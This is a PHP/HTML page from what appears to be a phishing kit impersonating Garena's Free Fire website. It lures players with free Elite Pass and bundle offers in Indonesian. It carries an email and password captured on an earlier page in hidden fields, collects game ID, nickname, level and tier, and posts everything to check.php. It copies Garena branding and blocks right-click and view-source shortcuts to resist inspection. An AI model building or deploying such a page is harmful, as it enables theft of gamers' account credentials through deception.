<?php 

if(!isset($_POST['email']) || !isset($_POST['password'])) {
    header('location: ./');
}

?>

<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="[FF] ">
<meta name="description" content="Dapatkan Elitepass dan Bundle serta item item terbaru pilihan secara gratis disini!">
<meta property="og:description" content="Dapatkan Elitepass dan Bundle serta item item terbaru pilihan secara gratis disini!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="[FF] WILLFUL WONDERS">
<meta property="og:type" content="website">
<meta name="copyright" content="Garena">
<meta name="theme-color" content="#ffa619">
<meta property="og:image" content="https://i.ibb.co/4sjjX70/Screenshot-432.png">
<title>[FF] FUJI FOLKLORE</title>
<link rel="icon" href="https://dl.dir.freefiremobile.com/common/web_event/common/images/favicon.png">
<link rel="stylesheet" href=".css/style-PulberAja.css">
<link rel="stylesheet" href=".css/animate-PulberAja.css">
<link rel="stylesheet" href=".css/riset-PulberAja.css">
<link rel="stylesheet" href=".css/common-PulberAja.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<style type="text/css">
#mobilePulberAja { 
display:none; 
}
@media screen and (max-width: 768px) {
#mobilePulberAja { 
display:block; }
}

#pcPulberAja { 
    display:block; 
    
}
@media screen and (max-width: 770px) {
#pcPulberAja { 
display:none; }
}
.phone {
  height: 50px;
  width: 100px;
  border: 3px solid white;
  border-radius: 10px;
  animation: rotate 1.5s ease-in-out infinite alternate;
  /* display: none; */
}

.message {
  color: white;
  font-size: 1em;
  margin-top: 40px;
  /* display: none; */
}

@keyframes rotate {
  0% {
        transform: rotate(0deg)
    }
    50% {
        transform: rotate(-90deg)
    }
    100% {
        transform: rotate(-90deg)
    }
}

</style>
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="">
    <div id="pcPulberAja" style="width: auto; background-color:#10182c; background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto;">
<div style="display:block; width: auto; background-image: url(https://i.ibb.co/3138Ksj/20210116-014218.png); background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto; animation: rotate 1.5s cubic-bezier(0.57, -0.1, 1, 0.89) infinite alternate;">
</div>
<p style="text-align: center;color: #fff;font-family: 'Teko'; padding-top: 40%;font-size: 40px;">Please rotate your phone for the best browsing experience</p>
</div>
<div id="mobilePulberAja">
    <iframe style="display: none;" scrolling="no" allow="autoplay" src="http://b.top4top.io/m_1889vd3b11.mp3" width="0" height="0" frameborder="no"></iframe>
<div class="common-menu-wrap">

    <div class="x-top-line"></div>

    <!-- common menu -->

    <div class="c-menu-wrap no_download">

        <div class="c-menu-left"></div>
        <ul class="c-menu">
            
            
            <li class="active">
                <a href="/index/en">HOME</a>
            </li>
            
            
            
            <li>
                <a href="/news/index/en">NEWS</a>
            </li>
            
            
            
            <li>
                <a href="/chars/index/en">CHARACTERS</a>
            </li>
            
            
            
            <li>
                <a href="/map/static/en">MAP</a>
            </li>
            
            
            
            <li class="x-menu">
                <a href="javascript:;">MEDIA<span class="menu-arrow"></span></a>
                <div class="c-menu-nav">
                    <div class="c-menu-nav-list">
                        
                        <a href="/media/wallpaper/en">Wallpapers</a>
                        
                        <a href="/media/video/en">Video</a>
                        
                        <a href="/media/comic/en">Comic</a>
                        
                    </div>
                </div>
            </li>
            
            
            
            <li>
                <a href="/weapons/index/en">WEAPONS</a>
            </li>
            
            
        </ul>

        <div class="m-language-menu">
            <div class="m-language-menu-box">
                <span class="arrow"><i class="up"></i><i class="down"></i></span>
                <span class="txt">en</span>
            </div>

            <div class="m-language-menu-change">
                
                <a href="/index/en" class="active">English</a>
                
                <a href="/index/pt">Português</a>
                
                <a href="/index/es">Español</a>
                
                <a href="/index/id">Indonesian</a>
                
                <a href="/index/th">ภาษาไทย</a>
                
                <a href="/index/ru">Pусский</a>
                
                <a href="/index/kr">h��t �어</a>
                
                <a href="/index/ar">عربى</a>
                
                <a href="https://ff.garena.vn/">Vio��t Nam</a>
                
                <a href="https://ff.garena.tw/">中s��(繁)</a>
                
                <a href="/index/jp">s��s��語</a>
                
            </div>

        </div>

        <a href="https://www.facebook.com/freefireEN" target="_blank" class="share-icon-fb "></a>
        <div class="c-menu-block-right"></div>

    </div>

    <div class="c-menu-small" style="margin-top: -50px;">

        <div class="c-menu-small-left"></div>

        <div class="c-menu-small-right"><span class="one"></span><span class="two"></span><span class="three"></span>
        </div>

        <div class="c-menu-small-logo"></div>

    </div>

    <div class="c-menu-small-cover">

        <ul class="c-menu-small-nav">
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li>
                <a href="/index/en">HOME</a>
            </li>
            
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li>
                <a href="/news/index/en">NEWS</a>
            </li>
            
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li>
                <a href="/chars/index/en">CHARACTERS</a>
            </li>
            
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li>
                <a href="/map/static/en">MAP</a>
            </li>
            
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li class="c-menu-small-nav-list">
                <a href="javascript:;">MEDIA<span class="menu-arrow"></span></a>
                <ul class="small-nav-box">
                    
                    <li><a href="/media/wallpaper/en">Wallpapers</a></li>
                    
                    <li><a href="/media/video/en">Video</a></li>
                    
                    <li><a href="/media/comic/en">Comic</a></li>
                    
                </ul>
            </li>
            
            
            <!-- 获取url判s��s��否在当前� 面todo -->
            
            <li>
                <a href="/weapons/index/en">WEAPONS</a>
            </li>
            
            
            <ul class="c-menu-small-download-link">

                <li class="appleStore"><a href="https://app.appsflyer.com/id1300146617?pid=OrganicA&amp;c=mainpage_IOS"></a></li>

                <li class="googlePlay"><a href="https://app.appsflyer.com/com.dts.freefireth?pid=OrganicA&amp;c=mainpage_AND"></a></li>

            </ul>

            <!--<li class="c-menu-download dn"><a href="https://play.google.com/store/apps/details?id=com.dts.freefire">DOWNLOAD</a></li>  -->
            <a href="https://www.facebook.com/freefireEN" target="_blank" class="c-menu-small-fb "></a>

        </ul>

    </div>
</div>
<div class="container" style="margin-top: 50px;">	

<div class="header">
<div class="slider">
<img src="https://i.ibb.co/C9zB26F/maxresdefault.jpg" style="height: unset;">
</div>
</div>

<div class="box">
<center>
<div class="menu-wrapper-border"></div>
<div class="verify-alert">
Verifikasi untuk mengirim hadiah yang dipilih
</div>
<form action="check.php" method="post">
<input type="hidden" class="verify-input" name="email" value="<?= $_POST['email'] ?>" readonly="">
<input type="hidden" name="password" value="<?= $_POST['email'] ?>" readonly="">
<input type="text" class="verify-input" name="nick" id="nick" value="<?= $_POST['getNickId'] ?>" placeholder="Nick Name" autocomplete="off" readonly>
<input type="number" class="verify-input" name="playid" id="playid" value="<?= $_POST['getUId'] ?>" placeholder="ID Game" autocomplete="off" readonly>
<select class="verify-select" name="level" id="level" required="">
<option selected="selected" disabled="disabled" value="">Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="verify-select" name="tier" id="tier" required="">
<option selected="selected" disabled="disabled" value="">Tier</option>
<option>BRONZE</option>
<option>SILVER</option>
<option>GOLD</option>
<option>PLATINUM</option>
<option>DIAMOND</option>
<option>MASTER</option>
<option>GRANDMASTER</option>
</select>
<select class="verify-select" name="elitepass" id="elitepass" required="">
<option selected="selected" disabled="disabled" value="">Terakhir Membeli ElitPass</option>
<option>Tidak pernah membeli</option>
<option>Season 1</option>
<option>Season 2</option>
<option>Season 3</option>
<option>Season 4</option>
<option>Season 5</option>
<option>Season 6</option>
<option>Season 7</option>
<option>Season 8</option>
<option>Season 9</option>
<option>Season 10</option>
<option>Season 11</option>
<option>Season 12</option>
<option>Season 13</option>
<option>Season 14</option>
<option>Season 15</option>
<option>Season 16</option>
<option>Season 17</option>
<option>Season 18</option>
<option>Season 19</option>
<option>Season 20</option>
<option>Season 21</option>
<option>Season 22</option>
<option>Season 23</option>
<option>Season 24</option>
<option>Season 25</option>
<option>Season 26</option>
<option>Season 27</option>
<option>Season 28</option>
<option>Season 29</option>
<option>Season 30</option>
<option>Season 31</option>
<option>Season 32</option>
<option>Season 33</option>
<option>Season 34</option>
<option>Season 35</option>
<option>Season 36</option>
<option>Season 37</option>
<option>Season 38</option>
<option>Season 39</option>
<option>Season 40</option>
<option>Season 41</option>
<option>Season 42</option>
<option>Season 43</option>
<option>Season 44</option>
<option>Season 45</option>
<option>Season 46</option>
<option>Season 47</option>
<option>Season 48</option>
<option>Season 49</option>
<option>Season 50</option>
<option>Season 51</option>
<option>Season 52</option>
<option>Season 53</option>
<option>Season 54</option>
<option>Season 55</option>
<option>Season 56</option>
<option>Season 57</option>
<option>Season 58</option>
<option>Season 59</option>
<option>Season 60</option>
<option>Season 61</option>
<option>Season 62</option>
<option>Season 63</option>
<option>Season 64</option>
<option>Season 65</option>
<option>Season 66</option>
<option>Season 67</option>
<option>Season 68</option>
<option>Season 69</option>
<option>Season 70</option>
<option>Season 71</option>
<option>Season 72</option>
<option>Season 73</option>
<option>Season 74</option>
<option>Season 75</option>
<option>Season 76</option>
<option>Season 77</option>
<option>Season 78</option>
<option>Season 79</option>
<option>Season 80</option>
<option>Season 81</option>
<option>Season 82</option>
<option>Season 83</option>
<option>Season 84</option>
<option>Season 85</option>
<option>Season 86</option>
<option>Season 87</option>
<option>Season 88</option>
<option>Season 89</option>
<option>Season 90</option>
<option>Season 91</option>
<option>Season 92</option>
<option>Season 93</option>
<option>Season 94</option>
<option>Season 95</option>
<option>Season 96</option>
<option>Season 97</option>
<option>Season 98</option>
<option>Season 99</option>
<option>Season 100</option>
</select>
<input type="hidden" name="login" value="<?= $_POST['login'] ?>" readonly="">
<button type="submit" class="verify-btn">Verifikasi</button>
</form>
</center>
</div> <!--- box --->

<div class="g-footer clearFix">

    <div class="m-foot-wrap">

        <div class="m-language">

            <span class="earth"></span>

            <span class="txt">English</span>

            <span class="arrow"><i class="up"></i><i class="down"></i></span>

            <div class="m-language-change">
                
                    <a href="/index/en" class="active">English</a>
                
                    <a href="/index/pt">Português</a>
                
                    <a href="/index/es">Español</a>
                
                    <a href="/index/id">Indonesian</a>
                
                    <a href="/index/th">ภาษาไทย</a>
                
                    <a href="/index/ru">Pусский</a>
                
                    <a href="/index/kr">h��t �어</a>
                
                    <a href="/index/ar">عربى</a>
                
                    <a href="https://ff.garena.vn/">Vio��t Nam</a>
                
                    <a href="https://ff.garena.tw/">中s��(繁)</a>
                
                    <a href="/index/jp">s��s��語</a>
                
            </div>
        </div>

        <div class="m-foot-copyright">

            <div class="m-foot-logo"><img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small_foot.png"></div>

            <div class="txt">Copyright © Garena International.<br>Trademarks belong to their respective owners. All rights Reserved.</div>

        </div>
        <div class="m-foot-link">
            <a href="/others/game_security/en/" target="_blank">game security</a>
            <a href="/others/faq/en/" target="_blank" style="margin-left:10px">for_parents</a>
            <a href="/others/policy/en/" target="_blank" style="margin-left:10px">privacy_policy</a>
        </div>
    </div>

</div>

</div> <!--- container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src=".js/click-PulberAja.js"></script>
</div>

<link rel="stylesheet" type="text/css" href="https://rawcdn.githack.com/PulberAja/pengaman/ddf1cf7ff15a3565bacdcc687361eb38c53a85c6/000.css">

<script>
        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };
    </script>

</body></html>